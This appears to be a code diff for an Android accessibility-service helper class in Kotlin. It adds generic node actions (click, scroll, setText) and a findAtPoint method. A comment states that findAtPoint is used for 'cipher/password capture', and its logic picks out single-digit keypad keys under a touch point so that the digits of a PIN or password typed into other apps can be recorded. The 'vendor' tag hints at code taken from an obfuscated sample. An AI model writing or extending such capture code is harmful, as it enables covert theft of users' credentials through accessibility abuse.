@@ -123,6 +123,90 @@ class UiObject(
         }
     }
 
+    // --- Actions (delegated to nodeInfo.performAction) ---
+
+    fun click(): Boolean =
+        try { nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK) } catch (_: Exception) { false }
+
+    fun longClick(): Boolean =
+        try { nodeInfo.performAction(AccessibilityNodeInfo.ACTION_LONG_CLICK) } catch (_: Exception) { false }
+
+    fun scrollForward(): Boolean =
+        try { nodeInfo.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD) } catch (_: Exception) { false }
+
+    fun scrollBackward(): Boolean =
+        try { nodeInfo.performAction(AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD) } catch (_: Exception) { false }
+
+    fun setText(value: String): Boolean =
+        try {
+            val args = android.os.Bundle()
+            args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, value)
+            nodeInfo.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
+        } catch (_: Exception) { false }
+
+    fun focus(): Boolean =
+        try { nodeInfo.performAction(AccessibilityNodeInfo.ACTION_ACCESSIBILITY_FOCUS) } catch (_: Exception) { false }
+
+    fun isClickable(): Boolean =
+        try { nodeInfo.isClickable } catch (_: Exception) { false }
+
+    fun isScrollable(): Boolean =
+        try { nodeInfo.isScrollable } catch (_: Exception) { false }
+
+    fun getClassName(): String? =
+        try { nodeInfo.className?.toString() } catch (_: Exception) { null }
+
+    fun getParent(): UiObject? {
+        return try {
+            val parent = nodeInfo.parent ?: return null
+            UiObject(parent, maxOf(depth - 1, 0))
+        } catch (_: Exception) { null }
+    }
+
+    // --- Point-based search (vendor m211777a3) ---
+
+    /**
+     * Find deepest clickable/visible node at screen coordinates (x, y).
+     * Searches children in reverse order (topmost Z-order first).
+     * Used by cipher/password capture for touch point identification.
+     */
+    fun findAtPoint(x: Float, y: Float): UiObject? {
+        val bounds = getBounds() ?: return null
+        if (!bounds.contains(x.toInt(), y.toInt())) return null
+
+        // Search children in reverse (topmost layer first)
+        val count = getChildCount()
+        for (i in count - 1 downTo 0) {
+            val child = getChild(i) ?: continue
+            val found = child.findAtPoint(x, y)
+            if (found != null) return found
+        }
+
+        // Self: clickable + visible → return this
+        if (isClickable() && isVisibleToUser()) return this
+
+        // Self: visible + has meaningful content (single digit text/desc, or resource ID with digit)
+        if (isVisibleToUser()) {
+            val text = getText()
+            val desc = getContentDescription()
+            val resId = getResourceId()
+
+            val textIsSingleDigit = text?.trim()?.length == 1 && text.trim()[0].isDigit()
+            val descIsSingleDigit = desc?.trim()?.length == 1 && desc.trim()[0].isDigit()
+            val resIdHasDigit = resId != null && resId.contains(":id/") &&
+                !resId.contains("delete", ignoreCase = true) &&
+                !resId.contains("enter", ignoreCase = true) &&
+                !resId.contains("cancel", ignoreCase = true) &&
+                resId.lastOrNull()?.isDigit() == true
+
+            if (textIsSingleDigit || descIsSingleDigit || resIdHasDigit) return this
+        }
+
+        return null
+    }
+
+    // --- Equality ---
+
     override fun equals(other: Any?): Boolean {
         if (this === other) return true
         if (other == null || other !is UiObject) return false
